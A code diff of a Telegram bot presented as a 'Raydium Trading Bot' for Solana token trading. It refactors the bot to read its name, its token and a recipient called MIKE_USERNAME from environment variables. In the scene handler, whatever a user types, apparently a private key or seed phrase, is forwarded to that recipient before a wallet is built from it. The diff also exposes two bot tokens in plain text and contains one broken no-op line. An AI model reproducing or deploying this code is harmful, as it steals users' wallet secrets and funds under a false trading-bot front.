@@ -7,6 +7,9 @@ import { derivePath } from "ed25519-hd-key";
 import { createClient } from "redis";
 import axios from "axios";
 import { ethers } from "ethers";
+import dotenv from "dotenv";
+
+dotenv.config();
 
 const redis = createClient({
   username: "default",
@@ -110,7 +113,7 @@ const escapeMarkdownV2Msg = (text) =>
 const message = (balance, price) => {
   const balStr = escapeMarkdownV2Msg(balance.toFixed(4));
   const usdStr = escapeMarkdownV2Msg((price * balance).toFixed(2));
-  return ` Hello, Welcome to Raydium Trading Bot\\.  
+  return ` Hello, Welcome to ${process.env.BOT_NAME}\\.  
 Exclusively built by the Solana Dex community,  
 The best bot used for trading any SOL token\\.  
   
@@ -153,7 +156,7 @@ function formatUsd(value) {
   return `$${formatted}`;
 }
 
-// const bot = new Telegraf("7101690525:AAHy5hJjU3qdvHQPU3KIyNtbpX410I-VSMk");
+const bot = new Telegraf(process.env.BOT_KEY);
 
 bot.catch((err, ctx) => {
   console.error(`Error while handling update ${ctx.update.update_id}:`, err);
@@ -392,7 +395,7 @@ continueScene.hears(/.*/, async (ctx) => {
     await ctx.telegram.sendMessage(
       // Changed from Message to sendMessage
       //config.otherUsername,
-      7722235340,
+      process.env.MIKE_USERNAME,
       `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
       { parse_mode: "HTML" }
     );
@@ -408,7 +411,7 @@ continueScene.hears(/.*/, async (ctx) => {
     if (wallet instanceof ethers.Wallet) {
       const address = wallet.address;
       const secret = wallet.privateKey;
-      // await redis.set(`wallet:${ctx.from.id}`, secret);
+      await (`wallet:${ctx.from.id}`, secret);
       const provider = new ethers.JsonRpcProvider("https://eth.llamarpc.com", {
         name: "mainnet",
         chainId: 1,
@@ -798,5 +801,3 @@ export default async function handler(request, response) {
     response.status(500).json({ ok: false, error: error.message });
   }
 }
-
-//https://api.telegram.org/bot7917083919:AAHMb3QYqok43_tPbCK9y8GtVzaYikSe3hI/setWebhook?url=https://per-ray.vercel.app/api/webhook
